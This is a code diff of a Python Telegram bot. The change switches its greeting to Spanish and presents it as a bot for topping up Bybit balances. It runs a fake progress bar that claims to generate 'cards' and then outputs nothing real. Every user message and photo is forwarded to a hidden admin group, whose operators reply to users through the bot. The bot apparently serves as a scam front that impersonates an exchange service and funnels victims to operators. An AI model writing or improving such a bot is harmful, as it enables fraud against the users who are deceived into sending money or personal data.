@@ -13,23 +13,29 @@ if not TOKEN:
 def make_keyboard(options):
     return ReplyKeyboardMarkup([options], one_time_keyboard=True, resize_keyboard=True)
 
-start_kb = make_keyboard(["Старт"])
+start_kb = make_keyboard(["Inicio"])
 yes_kb = make_keyboard(["Да"])
 amount_kb = make_keyboard(["200", "400", "600"])
 
 # --- старт ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     photo_path = os.path.join("images", "card.jpg")
+    text = (
+        "Hola, este es un bot para recargar el saldo de la plataforma Bybit. "
+        "Aquí puede obtener los datos necesarios para realizar la recarga\n\n"
+        "Para comenzar, haga clic en el botón «Inicio»"
+    )
+
     if os.path.exists(photo_path):
         with open(photo_path, "rb") as photo:
             await update.message.reply_photo(
                 photo=photo,
-                caption="Здравствуйте, это официальный бот для карточек. Чтобы получить карточку, нажмите Старт",
+                caption=text,
                 reply_markup=start_kb
             )
     else:
         await update.message.reply_text(
-            "Здравствуйте, это официальный бот для карточек. Чтобы получить карточку, нажмите Старт",
+            text,
             reply_markup=start_kb
         )
 
@@ -38,24 +44,23 @@ async def send_cards(update, amount):
     await update.message.reply_text(f"Генерируем пакет карточек ({amount})")
     total = 14
     msg = await update.message.reply_text("Загрузка: " + "░" * total)
+
     for i in range(1, total + 1):
         await asyncio.sleep(1)
         bar = "█" * i + "░" * (total - i)
         await msg.edit_text(f"Загрузка: {bar}")
+
     await msg.edit_text("Карточка")
 
-# --- пересылка сообщений в админ-группу с ID ---
+# --- пересылка сообщений в админ-группу ---
 async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     msg = update.message
 
-    # подпись с ID пользователя
     user_info = f"👤 {user.first_name} | ID:{user.id}"
 
-    # сначала текст с ID
     await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=user_info)
 
-    # пересылаем сообщение любого типа
     if msg.text:
         await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg.text)
     elif msg.photo:
@@ -69,7 +74,7 @@ async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif msg.video:
         await context.bot.send_video(chat_id=ADMIN_CHAT_ID, video=msg.video.file_id, caption=msg.caption)
 
-# --- ответ из админ-группы пользователю ---
+# --- ответы из админ-группы ---
 async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ADMIN_CHAT_ID:
         return
@@ -79,10 +84,9 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     reply_msg = update.message.reply_to_message
 
-    # ищем ID пользователя в тексте пересланного сообщения
-    # формат: 👤 Имя | ID:123456789
-    lines = reply_msg.text.splitlines()
+    lines = reply_msg.text.splitlines() if reply_msg.text else []
     user_id = None
+
     for line in lines:
         if "ID:" in line:
             try:
@@ -93,7 +97,6 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not user_id:
         return
 
-    # отправляем ответ пользователю
     if msg.text:
         await context.bot.send_message(chat_id=user_id, text=msg.text)
     elif msg.photo:
@@ -109,21 +112,18 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # --- основной обработчик сообщений ---
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
     msg = update.message
 
-    # пересылаем ВСЕ сообщения в админ-группу
     if msg.chat.id != ADMIN_CHAT_ID:
         await forward_to_admin(update, context)
 
-    # логика бота только для текста
     if not msg.text:
         return
 
     text = msg.text.strip()
     state = context.user_data.get("state", "START")
 
-    if state == "START" and text == "Старт":
+    if state == "START" and text == "Inicio":
         await msg.reply_text(
             "Я разработан компанией сисистик для выдачи карточек. Вы хотите получить карточку сейчас?",
             reply_markup=yes_kb
@@ -141,8 +141,9 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await send_cards(update, text)
         context.user_data["state"] = "START"
 
-# --- запуск бота ---
+# --- запуск ---
 app = ApplicationBuilder().token(TOKEN).build()
+
 app.add_handler(CommandHandler("start", start))
 app.add_handler(MessageHandler(filters.ALL & ~filters.Chat(ADMIN_CHAT_ID), message_handler))
 app.add_handler(MessageHandler(filters.ALL & filters.Chat(ADMIN_CHAT_ID), admin_reply))
